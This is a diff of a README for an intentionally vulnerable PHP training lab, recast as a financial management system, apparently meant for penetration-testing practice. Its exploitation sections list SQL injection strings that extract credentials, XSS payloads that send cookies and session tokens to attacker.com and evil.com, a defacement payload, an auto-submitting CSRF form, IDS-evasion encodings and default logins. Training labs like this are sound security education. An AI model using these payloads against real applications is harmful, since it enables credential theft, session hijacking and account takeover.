@@ -1,14 +1,26 @@
-# 🔴 DVWA - Damn Vulnerable Web Application (Training Lab)
+# 💰 Financial System DVWA - Vulnerable Financial Management System
 
-Aplikasi web yang sengaja vulnerable untuk pelatihan penetration testing. Dibuat dari nol dengan fokus 4 vulnerability utama:
-- SQL Injection (error-based + blind)
-- XSS Reflected
-- XSS Stored
-- CSRF
+[![GitHub](https://img.shields.io/badge/GitHub-Nadzare%2Fdvwa--system-blue?logo=github)](https://github.com/Nadzare/dvwa-system)
+[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](https://www.docker.com/)
+[![PHP](https://img.shields.io/badge/PHP-8.2-777BB4?logo=php)](https://www.php.net/)
+[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)
 
-## ⚡ NEW! IDS Evasion Support
+Aplikasi sistem keuangan yang sengaja vulnerable untuk pelatihan penetration testing dalam konteks financial applications. Dibuat dari nol dengan fokus 4 vulnerability utama:
+- SQL Injection (error-based + blind) - Pencarian transaksi keuangan
+- XSS Reflected - Laporan keuangan
+- XSS Stored - Catatan transaksi
+- CSRF - Ubah PIN transaksi
 
-**DVWA sekarang menerima payload dengan encoding untuk bypass IDS!**
+🔗 **Repository:** https://github.com/Nadzare/dvwa-system
+
+## ⚡ NEW! IDS Evasion Support untuk Financial System
+
+**Financial System DVWA sekarang menerima payload dengan encoding untuk bypass IDS!**
+
+Testing dalam konteks:
+- ✅ SQL Injection pada pencarian transaksi keuangan
+- ✅ XSS pada form laporan dan catatan transaksi
+- ✅ CSRF pada perubahan PIN transaksi
 
 ✅ Multi-level URL encoding (`%27`, `%2527`, `%252527`)  
 ✅ HTML entity encoding (`&#39;`, `&lt;script&gt;`)  
@@ -56,8 +68,8 @@ Aplikasi web yang sengaja vulnerable untuk pelatihan penetration testing. Dibuat
 
 1. **Clone Repository**
    ```bash
-   git clone https://github.com/kendikadimas/dvwa.git
-   cd dvwa
+   git clone https://github.com/Nadzare/dvwa-system.git
+   cd dvwa-system
    ```
 
 2. **Start Docker Container**
@@ -75,11 +87,12 @@ Aplikasi web yang sengaja vulnerable untuk pelatihan penetration testing. Dibuat
    ```
    Username: admin
    Password: admin123
+   Role: Financial Administrator
    ```
 
 ### Akses Aplikasi
-- **Indonesian:** http://localhost:8000/login_id.php
-- **English:** http://localhost:8000/login.php
+- **Indonesian:** http://localhost:8000/login_id.php (Sistem Keuangan)
+- **English:** http://localhost:8000/login.php (Financial System)
 
 **🎉 No manual database setup needed!** Cukup klik tombol di login page.
 
@@ -221,51 +234,62 @@ git push origin main
 
 ---
 
-## 🧪 Lab Vulnerabilities
+## 🧪 Lab Vulnerabilities - Financial System Context
 
-### 1. SQL Injection (SQLi)
+### 1. SQL Injection (SQLi) - Pencarian Transaksi
 **Lokasi:** `/sqli_id.php` (Indonesian) atau `/sqli.php` (English)
 
+**Skenario:** Sistem pencarian transaksi keuangan berdasarkan invoice number atau transaction ID
+
 **Exploitation:**
 ```
-1 OR 1=1                  → Show all records
+1 OR 1=1                  → Tampilkan semua transaksi keuangan
 1 UNION SELECT 1,2,3,4    → Test columns
-1 UNION SELECT username, password, 3, created_at FROM users  → Extract credentials
+1 UNION SELECT username, password, 3, created_at FROM users  → Extract kredensial staff finance
+' OR amount > 1000000 --  → Cari transaksi besar
 ```
 
-**Error-based & Blind SQLi supported**
+**Error-based & Blind SQLi supported**  
+**Impact:** Data breach rekening, transaksi, kredensial pegawai keuangan
 
-### 2. XSS - Reflected
+### 2. XSS - Reflected (Laporan Keuangan)
 **Lokasi:** `/xss_reflected_id.php`
 
+**Skenario:** Submit dan preview laporan keuangan sebelum dikirim
+
 **Exploitation:**
 ```
-<script>alert('XSS')</script>
-<img src=x onerror="alert('XSS')">
-<svg onload="alert('XSS')">
+<script>alert('Laporan Palsu')</script>
+<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
+<svg onload="window.location='http://attacker.com/steal?data='+btoa(document.body.innerHTML)">
 ```
 
-**Payload tercermin di URL - tidak tersimpan di database**
+**Payload tercermin di URL - bisa untuk phishing fake financial report**
 
-### 3. XSS - Stored
+### 3. XSS - Stored (Catatan Transaksi)
 **Lokasi:** `/xss_stored_id.php`
 
+**Skenario:** Staff finance menambahkan catatan/memo pada transaksi yang bisa dilihat semua user
+
 **Exploitation:**
 ```
-<script>alert('XSS')</script>     → Execute untuk semua user
-<img src=x onerror="...">          → Steal cookies
-<svg onload="...">                 → Redirect dengan data theft
+<script>alert('Transaksi Mencurigakan')</script>     → Execute untuk semua staff
+<img src=x onerror="fetch('http://evil.com?token='+localStorage.getItem('sessionToken'))">  → Steal session
+<svg onload="document.body.innerHTML='<h1>Sistem Down untuk Maintenance</h1>'">  → Defacement
 ```
 
-**Payload disimpan di database - execute saat halaman dimuat**
+**Payload disimpan di database - execute otomatis saat staff membuka halaman catatan transaksi**
 
-**🔄 Reset Database Button tersedia untuk clear payload**
+**🔄 Reset Database Button tersedia untuk clear malicious notes**
 
-### 4. CSRF - Change Password
+### 4. CSRF - Change Transaction PIN
 **Lokasi:** `/csrf_id.php`
+
+**Skenario:** Ubah PIN untuk otorisasi transaksi keuangan tanpa verifikasi CSRF token
 
 **Exploitation:**
 ```html
+<!-- Attacker's malicious page -->
 <form action="http://localhost:8000/csrf.php" method="POST">
     <input type="hidden" name="new_password" value="hacked123">
     <input type="hidden" name="confirm_password" value="hacked123">
@@ -273,28 +297,29 @@ git push origin main
 <script>document.forms[0].submit();</script>
 ```
 
-**Tidak ada CSRF token - form dapat dikirim dari sumber mana saja**
+**Tidak ada CSRF token - PIN dapat diubah jika admin mengklik link berbahaya**  
+**Impact:** Account takeover, unauthorized transaction approval
 
 ---
 
-## 📁 Project Structure
+## 📁 Project Structure - Financial System
 
 ```
-dvwalast/
+dvwa-system/
 ├── app/
 │   ├── config.php              # Database config
 │   ├── login.php               # English login (vulnerable SQLi)
-│   ├── login_id.php            # Indonesian login
-│   ├── dashboard.php           # English dashboard
-│   ├── dashboard_id.php        # Indonesian dashboard
-│   ├── sqli.php                # English SQLi lab
-│   ├── sqli_id.php             # Indonesian SQLi lab
-│   ├── xss_reflected.php       # English reflected XSS
-│   ├── xss_reflected_id.php    # Indonesian reflected XSS
-│   ├── xss_stored.php          # English stored XSS
-│   ├── xss_stored_id.php       # Indonesian stored XSS
-│   ├── csrf.php                # English CSRF lab
-│   ├── csrf_id.php             # Indonesian CSRF lab
+│   ├── login_id.php            # Indonesian login - Sistem Keuangan
+│   ├── dashboard.php           # English dashboard - Financial Admin
+│   ├── dashboard_id.php        # Indonesian dashboard - Dashboard Keuangan
+│   ├── sqli.php                # English SQLi lab - Transaction Search
+│   ├── sqli_id.php             # Indonesian SQLi lab - Pencarian Transaksi
+│   ├── xss_reflected.php       # English reflected XSS - Financial Report
+│   ├── xss_reflected_id.php    # Indonesian reflected XSS - Laporan Keuangan
+│   ├── xss_stored.php          # English stored XSS - Transaction Notes
+│   ├── xss_stored_id.php       # Indonesian stored XSS - Catatan Transaksi
+│   ├── csrf.php                # English CSRF lab - Change PIN
+│   ├── csrf_id.php             # Indonesian CSRF lab - Ubah PIN Transaksi
 │   ├── reset_db.php            # Database reset handler
 │   ├── logout.php              # Logout handler
 │   └── index.php               # Main entry point
@@ -310,17 +335,22 @@ dvwalast/
 
 ---
 
-## 🔐 Default Credentials
+## 🔐 Default Credentials - Financial System
 
+**Administrator (Full Access):**
 ```
 Username: admin
 Password: admin123
+Role: Financial Administrator
+Access: All financial modules, transaction approval, reports
 ```
 
-Atau:
+**Staff (Limited Access):**
 ```
 Username: user
 Password: user123
+Role: Finance Staff
+Access: View transactions, add notes
 ```
 
 ---
@@ -335,23 +365,44 @@ Password: user123
 
 ---
 
-## ⚠️ Security Warning
+## ⚠️ Security Warning - Financial System Context
 
-**DVWA is INTENTIONALLY VULNERABLE!**
+**This Financial System is INTENTIONALLY VULNERABLE!**
 
-- ✅ Gunakan hanya untuk training & learning
-- ✅ Jangan deploy ke production
-- ✅ Jangan gunakan untuk exploit real applications
-- ✅ Jangan bagikan kredensial dengan unauthorized users
+- ✅ Gunakan hanya untuk training & learning security dalam konteks financial applications
+- ✅ Jangan deploy ke production atau gunakan dengan data finansial real
+- ✅ Jangan gunakan untuk exploit real financial/banking systems
+- ✅ Training ini mensimulasikan kelemahan umum dalam aplikasi keuangan
+- ⚠️ Real financial systems harus implement: encryption, 2FA, audit logs, compliance standards
+
+**Learning Objectives:**
+- Memahami vulnerability dalam financial web applications
+- Praktek secure coding untuk sistem keuangan
+- Awareness terhadap impact finansial dari security breach
+- Testing IDS/IPS rules untuk financial transaction patterns
 
 ---
 
-## 📚 Learning Resources
+## 📚 Learning Resources - Financial Security
 
+### General Web Security:
 1. **OWASP Top 10** - https://owasp.org/www-project-top-ten/
 2. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
 3. **HackTheBox** - https://www.hackthebox.com
 4. **TryHackMe** - https://tryhackme.com
+
+### Financial & Banking Security:
+5. **PCI DSS Compliance** - https://www.pcisecuritystandards.org/
+6. **OWASP Financial Services** - https://owasp.org/www-industry/financial/
+7. **Financial Sector Cybersecurity** - NIST Framework
+8. **ISO 27001** - Information Security Management
+
+### Recommended Testing Path:
+1. Start dengan SQL Injection pada transaction search
+2. Test XSS pada financial reports dan notes
+3. Simulate CSRF attack pada PIN change
+4. Practice IDS evasion dengan financial payloads
+5. Analyze impact pada financial data integrity
 
 ---
 
